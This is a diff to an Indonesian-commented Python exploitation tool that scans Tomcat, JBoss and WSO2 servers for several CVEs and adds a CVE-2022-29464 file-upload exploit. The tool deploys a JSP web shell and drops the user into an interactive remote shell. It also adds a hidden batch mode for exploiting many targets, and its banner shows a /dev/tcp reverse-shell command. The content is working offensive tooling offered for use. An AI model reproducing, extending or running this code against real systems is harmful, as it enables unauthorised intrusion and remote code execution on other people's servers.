@@ -37,7 +37,7 @@ except ImportError:
 logging.captureWarnings(True)
 
 __author__ = "MHL TEAM (Original), Sincan2 (Refactoring)"
-__version__ = "3.8.0 (CVE-2025-31651 Added)"
+__version__ = "4.0.0 (CVE-2022-29464 Added)"
 
 # Definisi warna
 RED = '\x1b[91m'
@@ -86,7 +86,6 @@ def configure_http_pool():
     """Mengonfigurasi koneksi HTTP Pool berdasarkan argumen."""
     global gl_http_pool
     timeout = Timeout(connect=gl_args.timeout, read=gl_args.timeout * 2)
-    # Menambahkan retries=False untuk mencegah coba lagi pada koneksi yang gagal
     if gl_args.proxy:
         gl_http_pool = ProxyManager(proxy_url=gl_args.proxy, timeout=timeout, cert_reqs='CERT_NONE', retries=False)
     else:
@@ -105,31 +104,40 @@ def handler_interrupt(signum, frame):
 signal.signal(signal.SIGINT, handler_interrupt)
 
 def print_shell_banner(url):
-    """Menampilkan banner informasi shell."""
-    print(f"\n{BOLD}{GREEN}╔════════════════════════════════════════════════════════════╗")
-    print(f"║       Sincan2 Interactive Shell                                ║")
-    print(f"╠════════════════════════════════════════════════════════════╣")
-    print(f"║ {BLUE}Target Shell:{ENDC} {url.ljust(52)}║")
-    print(f"║ {BLUE}Ketik Perintah:{ENDC} 'id', 'ls -la', 'whoami', dll.                   ║")
-    print(f"║ {BLUE}Untuk Keluar:{ENDC}   Ketik 'exit' atau 'keluar'                      ║")
-    print(f"║ {BLUE}JexRemote:{ENDC}      jexremote=IPMU:PORT                           ║")
-    print(f"║ {BLUE}Reverse Shell:{ENDC}  /bin/bash -i > /dev/tcp/IPMU/PORT 0>&1 2>&1   ║")
-    print(f"{BOLD}{GREEN}╚════════════════════════════════════════════════════════════╝{ENDC}\n")
+    """Menampilkan banner informasi shell yang rapi."""
+    box_width = 60
+    max_url_len = box_width - len("Target Shell: ") - 3
+    if len(url) > max_url_len:
+        display_url = url[:max_url_len - 3] + "..."
+    else:
+        display_url = url
+
+    print(f"\n{BOLD}{GREEN}╔{'═' * box_width}╗{ENDC}")
+    print(f"{BOLD}{GREEN}║{'Sincan2 Interactive Shell'.center(box_width)}║{ENDC}")
+    print(f"{BOLD}{GREEN}╠{'═' * box_width}╣{ENDC}")
+    print(f"{BOLD}{GREEN}║ {BLUE}{'Target Shell:'.ljust(16)}{ENDC} {display_url.ljust(box_width - 18)} ║{ENDC}")
+    print(f"{BOLD}{GREEN}║ {BLUE}{'Ketik Perintah:'.ljust(16)}{ENDC} {'\'id\', \'ls\', \'whoami\', dll.'.ljust(box_width - 18)} ║{ENDC}")
+    print(f"{BOLD}{GREEN}║ {BLUE}{'Untuk Keluar:'.ljust(16)}{ENDC} {'Ketik \'exit\' atau \'keluar\''.ljust(box_width - 18)} ║{ENDC}")
+    print(f"{BOLD}{GREEN}║ {BLUE}{'JexRemote:'.ljust(16)}{ENDC} {'jexremote=IPMU:PORT'.ljust(box_width - 18)} ║{ENDC}")
+    print(f"{BOLD}{GREEN}║ {BLUE}{'Reverse Shell:'.ljust(16)}{ENDC} {'/bin/bash -i > /dev/tcp/...'.ljust(box_width - 18)} ║{ENDC}")
+    print(f"{BOLD}{GREEN}╚{'═' * box_width}╝{ENDC}\n")
+
 
 def parse_shell_output(raw_text):
     """Mencoba mem-parsing output mentah dari web shell."""
     try:
+        # Coba parse dari pre, jika gagal, fallback ke body
         if '<pre>' in raw_text:
-            output = raw_text.split('<pre>')[1].split('</pre>')[0]
+             output = raw_text.split('<pre>')[1].split('</pre>')[0]
+             return output.strip()
         elif '<body>' in raw_text:
-            output = raw_text.split('<body>')[1].split('</body>')[0]
+             output = raw_text.split('<body>')[1].split('</body>')[0]
+             return output.strip()
         else:
-            output = raw_text
-        return output.strip()
-    except IndexError:
-        return raw_text.strip()
+            return raw_text.strip()
     except Exception:
-        return "Gagal mem-parsing output dari server."
+        return raw_text.strip()
+
 
 def shell_loop(base_url):
     """Memulai loop shell interaktif."""
@@ -178,6 +186,8 @@ def check_vul(url):
         paths["Spoofed Data Bypass (CVE-2023-6236)"] = ""
         paths["Apache Tomcat Path Traversal (CVE-2025-24813)"] = ""
         paths["Tomcat Rewrite Bypass (CVE-2025-31651)"] = ""
+        # PERUBAHAN: Menambahkan CVE baru ke daftar pengecekan
+        paths["WSO2 File Upload (CVE-2022-29464)"] = ""
         
     results = {}
     for vector, path in paths.items():
@@ -185,21 +195,27 @@ def check_vul(url):
         print_and_flush(GREEN + f" [*] Memeriksa {vector:<45}" + ENDC, same_line=True)
         try:
             if "CVE-" in vector:
-                res = {} # Inisialisasi
+                res = {}
                 if "CVE-2022-0853" in vector: res = _exploits.test_jta_loop(url, headers)
                 elif "CVE-2023-5379" in vector: res = _exploits.send_ajp_oversize_header(url, headers)
                 elif "CVE-2023-1973" in vector: res = _exploits.post_large_form(url, headers)
                 elif "CVE-2023-6236" in vector: res = _exploits.send_spoofed_data(url, headers)
                 elif "CVE-2025-24813" in vector: res = _exploits.exploit_tomcat_cve_2025_24813(url, headers)
                 elif "CVE-2025-31651" in vector: res = _exploits.exploit_tomcat_rewrite_bypass_cve_2025_31651(url, headers)
+                # PERUBAHAN: Menambahkan panggilan ke fungsi baru
+                elif "CVE-2022-29464" in vector: res = _exploits.exploit_wso2_fileupload_cve_2022_29464(url, headers)
 
                 if res.get('status') == 'vulnerable':
                     print_and_flush(RED + f"  [ RENTAN ]" + ENDC)
                     if "CVE-2025-24813" in vector:
-                        exploit_url = f"{parsed_main_url.scheme}://{parsed_main_url.netloc}/mhl.jsp?cmd=id"
+                        exploit_url = f"{parsed_main_url.scheme}://{parsed_main_url.netloc}/mhl.jsp?ppp=id"
                         print_and_flush(f"    {YELLOW}└─> Coba eksploitasi: {exploit_url}{ENDC}")
                     elif "CVE-2025-31651" in vector:
-                        exploit_url = f"{parsed_main_url.scheme}://{parsed_main_url.netloc}/sec/orders/mhl.jsp?cmd=id"
+                        exploit_url = f"{parsed_main_url.scheme}://{parsed_main_url.netloc}/sec/orders/mhl.jsp?ppp=id"
+                        print_and_flush(f"    {YELLOW}└─> Shell diunggah, coba akses: {exploit_url}{ENDC}")
+                    # PERUBAHAN: Menampilkan contoh RCE untuk CVE baru
+                    elif "CVE-2022-29464" in vector:
+                        exploit_url = f"{parsed_main_url.scheme}://{parsed_main_url.netloc}/authenticationendpoint/mhl.jsp?ppp=id"
                         print_and_flush(f"    {YELLOW}└─> Shell diunggah, coba akses: {exploit_url}{ENDC}")
                     results[vector] = 200
                 elif res.get('status') in ['timeout', 'connection_error', 'failed_put', 'failed_get', 'error']:
@@ -232,10 +248,11 @@ def auto_exploit(url, vector):
         success = _exploits.exploit_jmx_invoker_file_repository(url)
     if success:
         print_and_flush(GREEN + f" [ SUCCESS ] Kode berhasil di-deploy! Shell tersedia di {shell_path}" + ENDC)
-        parsed_url = urlparse(url)
-        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
-        full_shell_url = base_url + shell_path
-        shell_loop(full_shell_url)
+        if not gl_args.batch_mode:
+            parsed_url = urlparse(url)
+            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+            full_shell_url = base_url + shell_path
+            shell_loop(full_shell_url)
         return True
     else:
         print_and_flush(RED + " [ FAILED ] Gagal mengeksploitasi via vektor ini."+ ENDC)
@@ -261,7 +278,6 @@ def banner():
 """
     print_and_flush(banner_text)
 
-
 if __name__ == "__main__":
     banner()
 
@@ -286,8 +302,10 @@ if __name__ == "__main__":
     parser.add_argument("--timeout", type=int, default=5, help="Waktu tunggu koneksi dalam detik (default: 5)")
     parser.add_argument("--auto-exploit", action="store_true", help="Coba eksploitasi otomatis dan buka shell interaktif jika berhasil.")
     
+    parser.add_argument("--batch-mode", action="store_true", help=argparse.SUPPRESS)
+    
     group_modern = parser.add_argument_group('Opsi Pengecekan Modern')
-    group_modern.add_argument("-M", "--scan-modern-vulns", action='store_true', help="Jalankan modul pengecekan modern (CVE 2022-2025). PERINGATAN: Berpotensi DoS.")
+    group_modern.add_argument("-M", "--scan-modern-vulns", action='store_true', help="Jalankan modul pengecekan modern. PERINGATAN: Berpotensi DoS.")
 
     gl_args = parser.parse_args()
 
@@ -329,23 +347,31 @@ if __name__ == "__main__":
             if gl_args.auto_exploit:
                 exploited = False
                 for vector in vulnerables:
-                    if exploited: break
+                    if exploited and not gl_args.batch_mode: break
+                    
+                    shell_path = None
+                    
                     if "CVE-2025-24813" in vector:
-                        print_and_flush(GREEN + f"\n [ SUCCESS ] RCE via {vector} berhasil! Shell tersedia di /mhl.jsp" + ENDC)
-                        parsed_url = urlparse(target_url)
-                        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
-                        shell_loop(base_url + "/mhl.jsp")
-                        exploited = True
+                        shell_path = "/mhl.jsp"
                     elif "CVE-2025-31651" in vector:
-                        print_and_flush(GREEN + f"\n [ SUCCESS ] RCE via {vector} berhasil! Shell tersedia di /sec/orders/mhl.jsp" + ENDC)
-                        parsed_url = urlparse(target_url)
-                        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
-                        shell_loop(base_url + "/sec/orders/mhl.jsp")
+                        shell_path = "/sec/orders/mhl.jsp"
+                    # PERUBAHAN: Menambahkan logika auto-exploit untuk CVE baru
+                    elif "CVE-2022-29464" in vector:
+                        shell_path = "/authenticationendpoint/mhl.jsp"
+
+                    if shell_path:
+                        print_and_flush(GREEN + f"\n [ SUCCESS ] RCE via {vector} berhasil! Shell tersedia di {shell_path}" + ENDC)
+                        if not gl_args.batch_mode:
+                            parsed_url = urlparse(target_url)
+                            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+                            shell_loop(base_url + shell_path)
                         exploited = True
+                        
                     elif "CVE" not in vector:
                         if auto_exploit(target_url, vector):
                             exploited = True
-                if exploited:
+                
+                if exploited and not gl_args.batch_mode:
                     print_and_flush(BOLD + GREEN + f"\n[!!!] Eksploitasi Berhasil untuk {target_url}! Sesi shell ditutup." + ENDC)
             else:
                 print_and_flush(BLUE + "[INFO] Untuk mencoba eksploitasi, jalankan kembali perintah dengan flag --auto-exploit" + ENDC)
